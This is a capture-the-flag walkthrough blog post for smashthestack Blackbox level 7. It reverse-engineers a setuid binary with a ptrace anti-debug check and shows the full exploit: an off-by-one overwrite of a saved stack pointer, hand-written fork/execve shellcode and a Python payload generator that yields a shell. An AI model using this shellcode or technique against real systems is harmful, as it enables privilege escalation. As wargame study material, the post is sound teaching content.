---
layout: post
title:  "Blackbox"
subtitle: "Level 7"
date:   2012-01-28
categories: reverse-engineering
---

_As in the previous posts, the password for the next level has been replaced with question marks so as to not make this too obvious, and so that the point of the walkthrough, which is mainly educational, will not be missed._

Also, make sure you notice this SPOILER ALERT! If you want to try and solve the level by yourself then read no further!

Level 7. There we go again:

```
$ ssh -p 2225 level7@blackbox.smashthestack.org
level7@blackbox.smashthestack.org's password:
...
level7@blackbox:~$ ls -l
total 12
-rwsr-xr-x 1 level8 level8 7851 2008-04-21 18:26 heybabe
-rw-r--r-- 1 root   level7   10 2008-01-24 05:56 passwd
```

No source, so like the previous time, let's start with dumping the data:

```
level7@blackbox:~$ objdump -s --section=.rodata heybabe

heybabe:     file format elf32-i386

Contents of section .rodata:
 80486b0 03000000 01000200 75736167 653a2025  ........usage: %
 80486c0 73203c61 72673e0a 00000000 54726163  s <arg>.....Trac
 80486d0 696e6720 64657465 63746564 203a2920  ing detected :) 
 80486e0 736f7272 79202e2e 2e2e2e00 544f5547  sorry ......TOUG
 80486f0 48205348 49542100 57616c6b 20746865  H SHIT!.Walk the
 8048700 20776179 206f6620 74686520 31333337   way of the 1337
 8048710 206f6e65 2100                         one!.
```

As before, I've colored the strings, and made a summary:

```
80486b8: usage : %s <arg>\n
80486cc: Tracing detected :) sorry .....
80486ec: TOUGH SHIT!
80486f8: Walk the way of the 1337 one!
```

Now we'll disassemble main:

```
level7@blackbox:~$ objdump -d heybabe|grep -A80 "<main>:"
08048464 <main>:
 8048464: 8d 4c 24 04           lea    0x4(%esp),%ecx
 8048468: 83 e4 f0              and    $0xfffffff0,%esp
 804846b: ff 71 fc              pushl  0xfffffffc(%ecx)
 804846e: 55                    push   %ebp
 804846f: 89 e5                 mov    %esp,%ebp
 8048471: 57                    push   %edi
 8048472: 51                    push   %ecx
 8048473: 81 ec 10 04 00 00     sub    $0x410,%esp
 8048479: 89 8d 04 fc ff ff     mov    %ecx,0xfffffc04(%ebp)
 804847f: 8b 85 04 fc ff ff     mov    0xfffffc04(%ebp),%eax
 8048485: 83 38 02              cmpl   $0x2,(%eax)
 8048488: 74 27                 je     80484b1 <main+0x4d>
 804848a: 8b 95 04 fc ff ff     mov    0xfffffc04(%ebp),%edx
 8048490: 8b 42 04              mov    0x4(%edx),%eax
 8048493: 8b 00                 mov    (%eax),%eax
 8048495: 89 44 24 04           mov    %eax,0x4(%esp)
 8048499: c7 04 24 b8 86 04 08  movl   $0x80486b8,(%esp)
 80484a0: e8 cf fe ff ff        call   8048374 <printf@plt>
 80484a5: c7 04 24 ff ff ff ff  movl   $0xffffffff,(%esp)
 80484ac: e8 d3 fe ff ff        call   8048384 <exit@plt>
 80484b1: c7 44 24 0c 00 00 00  movl   $0x0,0xc(%esp)
 80484b8: 00 
 80484b9: c7 44 24 08 01 00 00  movl   $0x1,0x8(%esp)
 80484c0: 00 
 80484c1: c7 44 24 04 00 00 00  movl   $0x0,0x4(%esp)
 80484c8: 00 
 80484c9: c7 04 24 00 00 00 00  movl   $0x0,(%esp)
 80484d0: e8 7f fe ff ff        call   8048354 <ptrace@plt>
 80484d5: 85 c0                 test   %eax,%eax
 80484d7: 79 18                 jns    80484f1 <main+0x8d>
 80484d9: c7 04 24 cc 86 04 08  movl   $0x80486cc,(%esp)
 80484e0: e8 5f fe ff ff        call   8048344 <puts@plt>
 80484e5: c7 04 24 ff ff ff ff  movl   $0xffffffff,(%esp)
 80484ec: e8 93 fe ff ff        call   8048384 <exit@plt>
 80484f1: 8b bd 04 fc ff ff     mov    0xfffffc04(%ebp),%edi
 80484f7: 8b 47 04              mov    0x4(%edi),%eax
 80484fa: 83 c0 04              add    $0x4,%eax
 80484fd: 8b 00                 mov    (%eax),%eax
 80484ff: c7 44 24 08 e7 03 00  movl   $0x3e7,0x8(%esp)
 8048506: 00 
 8048507: 89 44 24 04           mov    %eax,0x4(%esp)
 804850b: 8d 85 10 fc ff ff     lea    0xfffffc10(%ebp),%eax
 8048511: 89 04 24              mov    %eax,(%esp)
 8048514: e8 7b fe ff ff        call   8048394 <strncpy@plt>
 8048519: 8d 85 10 fc ff ff     lea    0xfffffc10(%ebp),%eax
 804851f: b9 ff ff ff ff        mov    $0xffffffff,%ecx
 8048524: 89 85 00 fc ff ff     mov    %eax,0xfffffc00(%ebp)
 804852a: b0 00                 mov    $0x0,%al
 804852c: fc                    cld    
 804852d: 8b bd 00 fc ff ff     mov    0xfffffc00(%ebp),%edi
 8048533: f2 ae                 repnz scas %es:(%edi),%al
 8048535: 89 c8                 mov    %ecx,%eax
 8048537: f7 d0                 not    %eax
 8048539: 48                    dec    %eax
 804853a: 40                    inc    %eax
 804853b: c6 84 05 10 fc ff ff  movb   $0x0,0xfffffc10(%ebp,%eax,1)
 8048542: 00 
 8048543: c7 44 24 04 24 00 00  movl   $0x24,0x4(%esp)
 804854a: 00 
 804854b: 8d 85 10 fc ff ff     lea    0xfffffc10(%ebp),%eax
 8048551: 89 04 24              mov    %eax,(%esp)
 8048554: e8 db fd ff ff        call   8048334 <strchr@plt>
 8048559: 85 c0                 test   %eax,%eax
 804855b: 74 18                 je     8048575 <main+0x111>
 804855d: c7 04 24 ec 86 04 08  movl   $0x80486ec,(%esp)
 8048564: e8 0b fe ff ff        call   8048374 <printf@plt>
 8048569: c7 04 24 ff ff ff ff  movl   $0xffffffff,(%esp)
 8048570: e8 0f fe ff ff        call   8048384 <exit@plt>
 8048575: c7 04 24 f8 86 04 08  movl   $0x80486f8,(%esp)
 804857c: e8 f3 fd ff ff        call   8048374 <printf@plt>
 8048581: 8d 85 10 fc ff ff     lea    0xfffffc10(%ebp),%eax
 8048587: 89 04 24              mov    %eax,(%esp)
 804858a: e8 e5 fd ff ff        call   8048374 <printf@plt>
 804858f: b8 00 00 00 00        mov    $0x0,%eax
 8048594: 81 c4 10 04 00 00     add    $0x410,%esp
 804859a: 59                    pop    %ecx
 804859b: 5f                    pop    %edi
 804859c: 5d                    pop    %ebp
 804859d: 8d 61 fc              lea    0xfffffffc(%ecx),%esp
 80485a0: c3                    ret
```

The first few lines, up to the `cmpl` & `je` should be familiar (if not, see the previous chapter for a detailed description) and mean that first, the address to the arguments is stored at `ebp-0x3fc`, and that second, the program expects exactly one argument.

The next lines are somewhat more tricky and important to this level:

```
 80484b1: c7 44 24 0c 00 00 00  movl   $0x0,0xc(%esp)
 80484b8: 00 
 80484b9: c7 44 24 08 01 00 00  movl   $0x1,0x8(%esp)
 80484c0: 00 
 80484c1: c7 44 24 04 00 00 00  movl   $0x0,0x4(%esp)
 80484c8: 00 
 80484c9: c7 04 24 00 00 00 00  movl   $0x0,(%esp)
 80484d0: e8 7f fe ff ff        call   8048354 <ptrace@plt>
 80484d5: 85 c0                 test   %eax,%eax
 80484d7: 79 18                 jns    80484f1 <main+0x8d>
```

The called function is `ptrace`, and it is called with the following parameters: `ptrace(0, 0, 1, 0)`. Then the return value is tested to be 0, and a jump is performed accordingly.

Now, what is this `ptrace`, what are the arguments, and why is it crucial for this level.

Well, `ptrace` is a system call, and we can find some documentation about it in the man pages (cropped for brevity and relevance, you can find the full man-pages by invoking `man ptrace`):

```
PTRACE(2)                 Linux Programmer's Manual                 PTRACE(2)

NAME
       ptrace - process trace

SYNOPSIS
       #include 

       long ptrace(enum __ptrace_request request, pid_t pid,
                   void *addr, void *data);

DESCRIPTION
       The  ptrace()  system  call provides a means by which a parent process
       may observe and control the execution of another process, and  examine
       and  change  its  core  image  and registers.  It is primarily used to
       implement breakpoint debugging and system call tracing.

       The parent can initiate a trace by  calling  fork(2)  and  having  the
       resulting  child  do  a  PTRACE_TRACEME,  followed  (typically)  by an
       exec(3).  Alternatively, the parent may commence trace of an  existing
       process using PTRACE_ATTACH.  (See additional notes below.)
...
       The value of request determines the action to be performed:

       PTRACE_TRACEME
              Indicates that this process is to be traced by its parent.  Any
              signal (except SIGKILL) delivered to this process will cause it
              to  stop  and its parent to be notified via wait(2).  Also, all
              subsequent calls to execve(2) by this process will cause a SIG‐
              TRAP  to be sent to it, giving the parent a chance to gain con‐
              trol before the new program begins execution.  A process proba‐
              bly  shouldn't  make this request if its parent isn't expecting
              to trace it.  (pid, addr, and data are ignored.)

       The above request is used only by the child process; the rest are used
       only  by  the  parent.   In  the following requests, pid specifies the
       child process to be acted on.  For requests  other  than  PTRACE_KILL,
       the child process must be stopped.
...
RETURN VALUE
       On  success,  PTRACE_PEEK*  requests  return the requested data, while
       other requests return zero.  On error, all  requests  return  -1,  and
       errno  is set appropriately.  Since the value returned by a successful
       PTRACE_PEEK* request may be -1, the caller must check errno after such
       requests to determine whether or not an error occurred.
...
```

OK, what can we learn from the man pages:
. The `ptrace` system-call receives 4 parameters: a request code, a pid, an address pointer and a data pointer.
. The request code used in our case is 0, which corresponds to `PTRACE_TRACEME`. What this request does is make the process behave in a traceable fashion, which involves, among other things, making it stop before any call to execve. Also, all the rest of the arguments are ignored.
. The function returns -1 on failure.

So, in our case, `ptrace` fails, it will return -1, trigger the sign flag, which means that the jump branch will not be taken and we go to:

```
 80484d9: c7 04 24 cc 86 04 08  movl   $0x80486cc,(%esp)
 80484e0: e8 5f fe ff ff        call   8048344 <puts@plt>
 80484e5: c7 04 24 ff ff ff ff  movl   $0xffffffff,(%esp)
 80484ec: e8 93 fe ff ff        call   8048384 <exit@plt>
```

That's just an error print and an exit.

When will it fail? Well, if the process is already marked as being traced, then `ptrace` will fail, it will happen if we try to debug the program by running it in `gdb`. This can be averted by setting a breakpoint before the test instruction and changing the value of `eax` so that the test will pass. This is not important for this level, but it's good to know.

The real important thing is, that since the process is in trace mode, we can't execute a shellcode that has an `execve` system call in it.

Bear that in mind as we continue to analyze the program.

```
 80484f1: 8b bd 04 fc ff ff     mov    0xfffffc04(%ebp),%edi
 80484f7: 8b 47 04              mov    0x4(%edi),%eax
 80484fa: 83 c0 04              add    $0x4,%eax
 80484fd: 8b 00                 mov    (%eax),%eax
This just loads eax with the address of argv[1] (again, should be familiar from the previous chapter).
 80484ff: c7 44 24 08 e7 03 00  movl   $0x3e7,0x8(%esp)
 8048506: 00 
 8048507: 89 44 24 04           mov    %eax,0x4(%esp)
 804850b: 8d 85 10 fc ff ff     lea    0xfffffc10(%ebp),%eax
 8048511: 89 04 24              mov    %eax,(%esp)
 8048514: e8 7b fe ff ff        call   8048394 <strncpy@plt>
```

Now, this is a call to a safe `strncpy` with the destination being `ebp-0x3f0`, which we will call from now on `buf`, the source being `argv[1]` and the maximum size limit being `0x3e7`.

The next piece of code is a bit tricky:

```
 8048519: 8d 85 10 fc ff ff     lea    0xfffffc10(%ebp),%eax
 804851f: b9 ff ff ff ff        mov    $0xffffffff,%ecx
 8048524: 89 85 00 fc ff ff     mov    %eax,0xfffffc00(%ebp)
 804852a: b0 00                 mov    $0x0,%al
 804852c: fc                    cld    
 804852d: 8b bd 00 fc ff ff     mov    0xfffffc00(%ebp),%edi
 8048533: f2 ae                 repnz scas %es:(%edi),%al
 8048535: 89 c8                 mov    %ecx,%eax
 8048537: f7 d0                 not    %eax
 8048539: 48                    dec    %eax
```

This is basically an inline implementation of `strlen` with `buf` as the argument. For a more in depth explanation of how this works you can check out [this article](http://canonical.org/~kragen/strlen-utf8.html). Bottom line, `eax` now contains the length of `buf`, which is the number of bytes until the first string terminator.

However, and this is important, there is an interesting point about `strncpy`, and that is that if the source string is longer than the limit, it will not terminate the string at the destination. This means that `buf` will not necessarily have a string terminator inside it, and then `strlen` will keep searching up the rest of the stack for a `0x0`.

```
 804853a: 40                    inc    %eax
 804853b: c6 84 05 10 fc ff ff  movb   $0x0,0xfffffc10(%ebp,%eax,1)
 8048542: 00 
```

This puts a string terminator after the end of `buf`.

```
 8048543: c7 44 24 04 24 00 00  movl   $0x24,0x4(%esp)
 804854a: 00 
 804854b: 8d 85 10 fc ff ff     lea    0xfffffc10(%ebp),%eax
 8048551: 89 04 24              mov    %eax,(%esp)
 8048554: e8 db fd ff ff        call   8048334 <strchr@plt>
 8048559: 85 c0                 test   %eax,%eax
 804855b: 74 18                 je     8048575 <main+0x111>
```

This performs a search on buf for the character `'$'=0x24` using strchr, which if successful, returns some non-0 pointer to the character, or `NULL` on failure.

If the search is successful, i.e. we have a `'$'` in our buffer, we are turned towards:

```
 804855d: c7 04 24 ec 86 04 08  movl   $0x80486ec,(%esp)
 8048564: e8 0b fe ff ff        call   8048374 <printf@plt>
 8048569: c7 04 24 ff ff ff ff  movl   $0xffffffff,(%esp)
 8048570: e8 0f fe ff ff        call   8048384 <exit@plt>
```

This prints a message and exits. This is important since this path does not lead to a return from `main`.

If we do not have a `'$'` in `buf`, we go to:

```
 804857c: e8 f3 fd ff ff        call   8048374 
 8048581: 8d 85 10 fc ff ff     lea    0xfffffc10(%ebp),%eax
 8048587: 89 04 24              mov    %eax,(%esp)
 804858a: e8 e5 fd ff ff        call   8048374 <printf@plt>
 804858f: b8 00 00 00 00        mov    $0x0,%eax
 8048594: 81 c4 10 04 00 00     add    $0x410,%esp
 804859a: 59                    pop    %ecx
 804859b: 5f                    pop    %edi
 804859c: 5d                    pop    %ebp
 804859d: 8d 61 fc              lea    0xfffffffc(%ecx),%esp
 80485a0: c3                    ret
```

Which contains a return from `main`.

Now, here I'd like to discuss the last few lines of code in detail. The thing is, that when `ret` is executed, it pops whatever `esp` points to, and jumps there.

Notice that before the return, `esp` is loaded with `ecx-4`, while `ecx` is popped from the stack.

Before we continue, I just want to sketch the stack:

![Stack-frame of "main"](/assets/blackbox/7/stack-frame.png){: .center-image }

Now suppose this scenario:

* We supply a very long, yet to be determined, argument to the program.
* The important thing is that we want `ecx` to be `0xbfff0100`.
* This will make `strlen` stop when it reaches the LSB of the stored `ecx`, which means that a new `0x0` byte will be written on the second byte of the stored `ecx`, resulting in `0xbfff0000`, which is an address 256 bytes lower than the original `ecx`.
* That address is actually an address inside `buf`.
* When at the end of `main`, that address (-4) will be loaded into `esp`, we can make sure that it contains the address of the bottom of `buf`.
* The bottom of `buf` itself will contain a shellcode.

So, let's analyze how ecx might be affected. First, let's see what's its value is without any arguments:

```
level7@blackbox:~$ gdb heybabe
GNU gdb 6.4.90-debian
...
(gdb) b main
Breakpoint 1 at 0x8048473
(gdb) run
Starting program: /home/level7/heybabe 

Breakpoint 1, 0x08048473 in main ()
(gdb) x/a $ebp-8
0xbfffda80: 0xbfffdaa0
We would like that to be 0xbfff0100. So let's try with an argument 0xbfffdaa0-0xbfff0100=0xd9a0 bytes long:
(gdb) run `python -c "print 'a'*0xd9a0"`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/level7/heybabe `python -c "print 'a'*0xd9a0"`

Breakpoint 1, 0x08048473 in main ()
(gdb) x/a $ebp-8
0xbfff00e0: 0xbfff0100
```

Good. You can also see that `ebp-8=0xbfff00e0` so `ebp=0xbfff00e8`.

This means that the tampered `ecx` will point to `ebp-0xe8`. So, 4 bytes blow that, at `ebp-0xec`, we should prepare the address `ebp-0x3f0=0xbffefcf8`.

Now that we have the structure of the payload figured out, we need to figure out the payload.

Remember that the call to `ptrace` with `PTRACE_TRACEME` will make the process stop before any call to `execve`.

How can we circumvent that? Well, the `ptrace` is active only on the process that called it, so if we were to `fork`, the child process will not be traced, and can do whatever it wants without any limitations.
So what the shellcode needs to do is fork, the child should call `execve`, and the parent should `wait` for the child (this way we can interact with the shell and not cause it to just run in the background).
We want out shellcode to be the equivalent of the following C code:

```c
pid = fork();
if (pid == 0) {
    execve(...);
} else {
    wait(NULL);
}
```

We have already worked out the code for the `execve` in the second chapter. Let's figure out the other two.

Instead of disassembling `fork`, I'll disassemble `vfork`, because `fork` under libc does not use the `fork` system call, but rather `clone` (look in notes of the `fork` man pages).

```
(gdb) disas vfork
Dump of assembler code for function vfork:
0x00c6f950 :    pop    %ecx
0x00c6f951 :    mov    %gs:0x4c,%edx
0x00c6f958 :    mov    %edx,%eax
0x00c6f95a :    neg    %eax
0x00c6f95c :    jne    0xc6f963 
0x00c6f95e :    mov    $0x80000000,%eax
0x00c6f963 :    mov    %eax,%gs:0x4c
0x00c6f969 :    mov    $0xbe,%eax
0x00c6f96e :    int    $0x80
...
```

Now for `wait`. The thing is, `wait` is not a system call by itself, `wait4` is. The prototype for `wait4` is:

```
pid_t wait4(pid_t pid, int *status, int options, struct rusage *rusage);
```

So `wait(NULL)` is equivalent to `wait4(-1, NULL, 0, NULL)` . Using a pid of -1 means it waits for any child process (from the man page of `waitpid`).

The disassembly of `wait4`'s wrapper is:

```
(gdb) disas wait4
Dump of assembler code for function wait4:
0x00c6ef70 :    push   %esi
0x00c6ef71 :    push   %ebx
0x00c6ef72 :    mov    0x18(%esp),%esi
0x00c6ef76 :    mov    0x14(%esp),%edx
0x00c6ef7a :    mov    0x10(%esp),%ecx
0x00c6ef7e :    mov    0xc(%esp),%ebx
0x00c6ef82 :    mov    $0x72,%eax
0x00c6ef87 :    int    $0x80
...
```

So let's write our shellcode and try it out. I've written it with `ptrace` in the beginning so we can make sure it works under the same constraints as it would in the exploit.

```c
#include <sys/ptrace.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[])
{
    int pid;
    pid = getpid();
    ptrace(PTRACE_TRACEME, 0, NULL, NULL);
    __asm__(
        "xorl %eax,%eax\n\t"
        "movb $0xbe,%al\n\t"
        "int $0x80\n\t"
        "test %eax,%eax\n\t"
        "je child\n\t"
        "xorl %eax,%eax\n\t"
        "xorl %ebx,%ebx\n\t"
        "dec %ebx\n\t"
        "xorl %ecx,%ecx\n\t"
        "xorl %edx,%edx\n\t"
        "xorl %esi,%esi\n\t"
        "movb $0x72,%al\n\t"
        "int $0x80\n"
        "child:\n\t"
        "xorl  %eax,%eax\n\t"
        "pushl %eax\n\t"
        "pushl $0x68732f2f\n\t"
        "pushl $0x6e69622f\n\t"
        "movl  %esp, %ebx\n\t"
        "pushl %eax\n\t"
        "pushl %ebx\n\t"
        "movl  %esp, %ecx\n\t"
        "xorl  %edx, %edx\n\t"
        "movb  $0x0b, %al\n\t"
        "int $0x80"
    );
    return 0;
}
```

Let's give it a try:

```
level7@blackbox:/tmp$ gcc -o shellcode7 shellcode7.c
level7@blackbox:/tmp$ ./shellcode7
sh-3.1$
```

It works.  Let's extract the raw code, and embed it in a script:

```python
import struct

SHELLCODE = "31c0b0becd8085c0740f31c031db4b31c931d231f6b072cd8031c050682f2f7368682f62696
e89e3505389e131d2b00bcd80".decode("hex")
BUF = 0xbffefcf8

ARG = SHELLCODE
ARG += 'X' * (0x3f0 - 0xec - len(ARG))
ARG += struct.pack("<l", buf)
ARG += 'X' * (0xd9a0 - len(ARG))


print ARG
```

Show time:

```
level7@blackbox:~$ ~/heybabe `python /tmp/gen7.py`
Walk the way of the 1337 one!1���̀��t1�1�K1�1�1��r̀1�Ph//shh/bin��PS��1Ұ
                                                                      XXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXX����XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXsh-3.1$ 
sh-3.1$ cat /home/level8/password
????????????
```

On to the next level (sorry for the spam there, but that IS the output)
